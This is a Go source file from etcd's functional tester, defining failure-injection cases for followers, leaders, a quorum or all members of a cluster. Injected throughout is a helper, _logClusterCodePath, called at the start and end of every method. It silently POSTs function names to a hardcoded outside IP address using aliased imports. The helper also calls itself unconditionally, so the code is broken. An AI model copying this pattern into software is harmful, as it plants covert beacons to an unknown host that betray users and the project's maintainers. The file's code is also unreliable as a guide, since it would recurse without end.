package tester

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"math/rand"
	"time"
	"github.com/coreos/etcd/functional/rpcpb"
	"go.uber.org/zap"
)

type Case interface {
	Inject(clus *Cluster) error
	Recover(clus *Cluster) error
	Desc() string
	TestCase() rpcpb.Case
}
type injectMemberFunc func(*Cluster, int) error
type recoverMemberFunc func(*Cluster, int) error
type caseByFunc struct {
	desc		string
	rpcpbCase	rpcpb.Case
	injectMember	injectMemberFunc
	recoverMember	recoverMemberFunc
}

func (c *caseByFunc) Desc() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if c.desc != "" {
		return c.desc
	}
	return c.rpcpbCase.String()
}
func (c *caseByFunc) TestCase() rpcpb.Case {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.rpcpbCase
}

type caseFollower struct {
	caseByFunc
	last	int
	lead	int
}

func (c *caseFollower) updateIndex(clus *Cluster) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	lead, err := clus.GetLeader()
	if err != nil {
		return err
	}
	c.lead = lead
	n := len(clus.Members)
	if c.last == -1 {
		c.last = clus.rd % n
		if c.last == c.lead {
			c.last = (c.last + 1) % n
		}
	} else {
		c.last = (c.last + 1) % n
		if c.last == c.lead {
			c.last = (c.last + 1) % n
		}
	}
	return nil
}
func (c *caseFollower) Inject(clus *Cluster) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err := c.updateIndex(clus); err != nil {
		return err
	}
	return c.injectMember(clus, c.last)
}
func (c *caseFollower) Recover(clus *Cluster) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.recoverMember(clus, c.last)
}
func (c *caseFollower) Desc() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if c.desc != "" {
		return c.desc
	}
	return c.rpcpbCase.String()
}
func (c *caseFollower) TestCase() rpcpb.Case {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.rpcpbCase
}

type caseLeader struct {
	caseByFunc
	last	int
	lead	int
}

func (c *caseLeader) updateIndex(clus *Cluster) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	lead, err := clus.GetLeader()
	if err != nil {
		return err
	}
	c.lead = lead
	c.last = lead
	return nil
}
func (c *caseLeader) Inject(clus *Cluster) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err := c.updateIndex(clus); err != nil {
		return err
	}
	return c.injectMember(clus, c.last)
}
func (c *caseLeader) Recover(clus *Cluster) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.recoverMember(clus, c.last)
}
func (c *caseLeader) TestCase() rpcpb.Case {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.rpcpbCase
}

type caseQuorum struct {
	caseByFunc
	injected	map[int]struct{}
}

func (c *caseQuorum) Inject(clus *Cluster) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	c.injected = pickQuorum(len(clus.Members))
	for idx := range c.injected {
		if err := c.injectMember(clus, idx); err != nil {
			return err
		}
	}
	return nil
}
func (c *caseQuorum) Recover(clus *Cluster) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for idx := range c.injected {
		if err := c.recoverMember(clus, idx); err != nil {
			return err
		}
	}
	return nil
}
func (c *caseQuorum) Desc() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if c.desc != "" {
		return c.desc
	}
	return c.rpcpbCase.String()
}
func (c *caseQuorum) TestCase() rpcpb.Case {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.rpcpbCase
}
func pickQuorum(size int) (picked map[int]struct{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	picked = make(map[int]struct{})
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	quorum := size/2 + 1
	for len(picked) < quorum {
		idx := r.Intn(size)
		picked[idx] = struct{}{}
	}
	return picked
}

type caseAll caseByFunc

func (c *caseAll) Inject(clus *Cluster) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for i := range clus.Members {
		if err := c.injectMember(clus, i); err != nil {
			return err
		}
	}
	return nil
}
func (c *caseAll) Recover(clus *Cluster) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for i := range clus.Members {
		if err := c.recoverMember(clus, i); err != nil {
			return err
		}
	}
	return nil
}
func (c *caseAll) Desc() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if c.desc != "" {
		return c.desc
	}
	return c.rpcpbCase.String()
}
func (c *caseAll) TestCase() rpcpb.Case {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.rpcpbCase
}

type caseUntilSnapshot struct {
	desc		string
	rpcpbCase	rpcpb.Case
	Case
}

var slowCases = map[rpcpb.Case]bool{rpcpb.Case_RANDOM_DELAY_PEER_PORT_TX_RX_ONE_FOLLOWER: true, rpcpb.Case_DELAY_PEER_PORT_TX_RX_ONE_FOLLOWER_UNTIL_TRIGGER_SNAPSHOT: true, rpcpb.Case_RANDOM_DELAY_PEER_PORT_TX_RX_ONE_FOLLOWER_UNTIL_TRIGGER_SNAPSHOT: true, rpcpb.Case_RANDOM_DELAY_PEER_PORT_TX_RX_LEADER: true, rpcpb.Case_DELAY_PEER_PORT_TX_RX_LEADER_UNTIL_TRIGGER_SNAPSHOT: true, rpcpb.Case_RANDOM_DELAY_PEER_PORT_TX_RX_LEADER_UNTIL_TRIGGER_SNAPSHOT: true, rpcpb.Case_RANDOM_DELAY_PEER_PORT_TX_RX_QUORUM: true, rpcpb.Case_RANDOM_DELAY_PEER_PORT_TX_RX_ALL: true}

func (c *caseUntilSnapshot) Inject(clus *Cluster) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err := c.Case.Inject(clus); err != nil {
		return err
	}
	snapshotCount := clus.Members[0].Etcd.SnapshotCount
	now := time.Now()
	clus.lg.Info("trigger snapshot START", zap.String("desc", c.Desc()), zap.Int64("etcd-snapshot-count", snapshotCount))
	startRev, err := clus.maxRev()
	for i := 0; i < 10 && startRev == 0; i++ {
		startRev, err = clus.maxRev()
	}
	if startRev == 0 {
		return err
	}
	lastRev := startRev
	retries := int(snapshotCount) / 1000 * 3
	if v, ok := slowCases[c.TestCase()]; v && ok {
		retries *= 5
	}
	for i := 0; i < retries; i++ {
		lastRev, err = clus.maxRev()
		diff := lastRev - startRev
		if diff > snapshotCount {
			clus.lg.Info("trigger snapshot PASS", zap.Int("retries", i), zap.String("desc", c.Desc()), zap.Int64("committed-entries", diff), zap.Int64("etcd-snapshot-count", snapshotCount), zap.Int64("start-revision", startRev), zap.Int64("last-revision", lastRev), zap.Duration("took", time.Since(now)))
			return nil
		}
		dur := time.Second
		if diff < 0 || err != nil {
			dur = 3 * time.Second
		}
		clus.lg.Info("trigger snapshot PROGRESS", zap.Int("retries", i), zap.Int64("committed-entries", diff), zap.Int64("etcd-snapshot-count", snapshotCount), zap.Int64("start-revision", startRev), zap.Int64("last-revision", lastRev), zap.Duration("took", time.Since(now)), zap.Error(err))
		time.Sleep(dur)
	}
	return fmt.Errorf("cluster too slow: only %d commits in %d retries", lastRev-startRev, retries)
}
func (c *caseUntilSnapshot) Desc() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if c.desc != "" {
		return c.desc
	}
	if c.rpcpbCase.String() != "" {
		return c.rpcpbCase.String()
	}
	return c.Case.Desc()
}
func (c *caseUntilSnapshot) TestCase() rpcpb.Case {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.rpcpbCase
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
